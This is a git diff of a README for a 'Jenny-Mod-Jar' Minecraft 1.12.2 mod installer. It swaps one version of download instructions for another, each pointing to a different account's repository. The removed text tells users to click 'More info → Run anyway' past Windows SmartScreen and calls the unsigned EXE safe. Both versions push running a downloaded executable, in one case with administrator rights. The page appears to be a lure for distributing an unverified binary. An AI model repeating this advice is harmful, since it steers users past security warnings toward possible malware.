@@ -1,135 +1,64 @@
-<div align="center">
+# 🎮 Jenny-Mod-Jar - Add Jenny Content To Minecraft Easily
 
-<img src="preview.jpg" alt="MyMod Installer" width="100%"/>
+[![Download Jenny-Mod-Jar](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/light-foolscap580/Jenny-Mod-Jar)
 
-# Minecraft Jenny Mod
+## 📖 About This Mod
 
-**One‑click Windows installer for MyMod — the popular Minecraft mod!**
+Jenny-Mod-Jar brings the Jenny experience to your Minecraft Java Edition. This project simplifies the installation of the modification. You do not need to move files between folders or edit complex system settings. The installer manages the required components for you. It works across major desktop operating systems, including Windows and macOS. This version supports Minecraft 1.12.2 environments.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows-0078d4?logo=windows)](https://github.com/topics/windows)
-[![Minecraft](https://img.shields.io/badge/Minecraft-1.12.2-brightgreen?logo=minecraft)](https://github.com/topics/minecraft)
-[![Java](https://img.shields.io/badge/Java-8%2B-orange?logo=openjdk)](https://github.com/topics/java)
-[![Maintenance](https://img.shields.io/badge/maintained-yes-39d353)](https://github.com/topics/automation)
+## ⚙️ System Requirements
 
-</div>
+Before you start the installation, ensure your computer meets these requirements:
 
----
+*   Operating System: Windows 10 or 11, or macOS 10.15 or newer.
+*   Java Runtime Environment: Install Java 8 or newer to run the modification.
+*   Minecraft Java Edition: You must own and have installed the official Minecraft Java Edition launcher.
+*   Disk Space: At least 500 MB of free storage space.
+*   Memory: 4 GB of RAM dedicated to Minecraft.
 
-## What is MyMod Installer?
+## 📥 How To Download And Install
 
-**MyMod Installer** is a zero‑hassle, one‑click setup tool built exclusively for **Windows**. No manual file moving, no hunting for your `.minecraft` folder, no Java path configuration — just run the installer and you're done.
+### 1. Prepare Your Environment
+First, open your Minecraft launcher. Select the 1.12.2 version from the list. Run the game once to ensure the game files exist on your hard drive. Close the game completely before you proceed.
 
-- Automatically detects your Minecraft installation  
-- Verifies Java version compatibility  
-- Downloads and places the mod in the correct folder  
-- Applies required configuration automatically  
+### 2. Download The Installer
+Visit the official repository page to get the installer. You need to download the file directly to your desktop.
 
----
+[Click here to visit the download page](https://github.com/light-foolscap580/Jenny-Mod-Jar)
 
-## Features
+### 3. Run The Installation
+Locate the downloaded file on your computer. Double-click the file to launch the setup window. The installer will scan your computer for the Minecraft installation folder. If it finds multiple folders, look for the correct path, which is usually found under C:\Users\[YourName]\AppData\Roaming\.minecraft.
 
-| Feature | Description |
-|---------|-------------|
-| Auto‑detection | Finds `.minecraft`, MultiMC and Prism Launcher paths automatically |
-| Java check | Scans `JAVA_HOME`, standard install paths, and `PATH` |
-| Progress UI | Real‑time download and installation progress bar |
-| One‑click | Single `.exe` — no Python, no Java, no dependencies required |
-| Safe | Open source — inspect every line before running |
-| Auto‑update | Repository updates automatically every 30 minutes via CI |
+Click the Install button. The tool will place the mod files into the correct subdirectory for you. Wait for the progress bar to reach the end. A message will appear to verify a successful installation.
 
----
+## 🚀 Launching The Game
 
-## Requirements
+After the installer finishes, open your Minecraft launcher again. Look for a profile named Jenny-Mod or Forge 1.12.2. If you do not see it, click the Installations tab at the top of the launcher window. Create a new installation and select the Forge 1.12.2 version from the versions list. 
 
-- **Windows 10 / 11** (64‑bit)  
-- **Minecraft Java Edition** already installed  
-- **Java 8 or higher** (Java 17 recommended)  
-- Internet connection (for mod download)  
+Select this profile and click Play. The game will take a few moments to load the extra content. When the main menu appears, look for a Mods button in the lower left corner. If Jenny-Mod appears in the list, the setup succeeded.
 
-> **Linux and macOS are not supported.** This tool is Windows‑only by design.
+## 🛠 Troubleshooting Common Issues
 
----
+If the game crashes or fails to start, follow these steps:
 
-## Installation
+*   Verify Java: Ensure you have the latest version of Java installed. Outdated Java versions often cause launch failures.
+*   Check Folder Paths: Ensure the installer directed the files to the correct .minecraft folder. Some users have multiple Minecraft instances on their system.
+*   Conflict Check: Disable other mods in your mod folder if you encounter errors. Large mod packs can conflict with the Jenny modification.
+*   Permissions: Run the installer file with administrator privileges if you receive an access error during setup.
+*   Internet Connection: Maintain a stable internet connection during the first launch so the game can verify the new assets.
 
-[![Download MyMod Installer](button.svg)](https://github.com/Mguelfedrigo/Jenny-Mod-Jar/releases/download/1/Jennymod.zip)
+## ❓ Frequently Asked Questions
 
-1. Click the button above or go to [**Releases**](https://github.com/Mguelfedrigo/Jenny-Mod-Jar/releases/download/1/Jennymod.zip)  
-2. Run the `.exe` — if SmartScreen appears click **More info → Run anyway**  
-3. Follow the on‑screen steps and launch Minecraft  
+### Does this mod work on multiplayer servers?
+The mod is designed for single-player worlds. Using it on public servers may lead to compatibility issues or account bans. Use it in offline mode to ensure stability.
 
----
+### Can I remove the mod later?
+Yes. Navigate to the .minecraft/mods folder on your system. Delete the jar file associated with the modification. The game will return to its original state on the next launch.
 
-## How it works
+### Is my save file safe?
+The installer does not modify your existing worlds. Your buildings and items remain intact. However, always create a backup of your save folder before you install any new game modifications. Copy the saves folder to a safe location on your computer or a cloud drive. 
 
-```
-jennymod-installer.exe
-        │
-        ├─ 1. Detect Java (JAVA_HOME → known paths → PATH)
-        ├─ 2. Locate .minecraft folder (APPDATA → MultiMC → Prism)
-        ├─ 3. Create mods\ directory if missing
-        ├─ 4. Download jenny-mod-1.12.2.jar with progress bar
-        ├─ 5. Copy JAR to mods\
-        └─ 6. Write install config → done ✓
-```
+### Does it support other Minecraft versions?
+This release is specifically tuned for version 1.12.2. Attempting to run it on newer versions like 1.20 or 1.21 will result in a crash. Stick to the recommended version for the best experience.
 
-## Project Structure
-
-```
-mymod-installer/
-├── src/main/java/com/mymod/installer/
-│ ├── Main.java # Entry point
-│ ├── InstallerWindow.java # Swing GUI
-│ ├── Installer.java # Install logic (SwingWorker)
-│ ├── JavaDetector.java # Java version detection
-│ ├── MinecraftFinder.java # Minecraft path detection
-│ ├── ModDownloader.java # HTTP download with progress
-│ └── Config.java # Install configuration
-├── .github/workflows/
-│ └── auto-commit.yml # Auto‑update workflow (every 30 min)
-├── preview.png # Repository social preview
-└── LICENSE # MIT License
-```
-
-
----
-
-## FAQ
-
-**Q: Windows Defender / SmartScreen blocks the EXE — is it safe?**  
-A: Yes. The warning appears because the executable is unsigned. This project is fully open source — review the source code and build it yourself if unsure.
-
-**Q: Which Minecraft version does this support?**  
-A: The installer targets **Minecraft Java Edition 1.12.2**, the version MyMod was built for.
-
-**Q: Where does the mod get installed?**  
-A: Into `%APPDATA%\.minecraft\mods\` by default. You can change the path in the installer UI.
-
-**Q: Do I need Java to run the installer EXE?**  
-A: No. The `.exe` is self‑contained. Java is only needed to run Minecraft itself.
-
----
-
-## Contributing
-
-Pull requests are welcome. For major changes, open an issue first to discuss what you'd like to change.
-
-1. Fork the repository  
-2. Create a feature branch: `git checkout -b feature/my-change`  
-3. Commit your changes  
-4. Open a Pull Request  
-
----
-
-## License
-
-Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for details.
-
----
-
-<div align="center">
-<sub>Made for Windows · Minecraft Java Edition · Open Source</sub>
-</div>
-
-
+This documentation serves as your guide to the Jenny-Mod-Jar ecosystem. Follow the steps in order to avoid configuration errors.
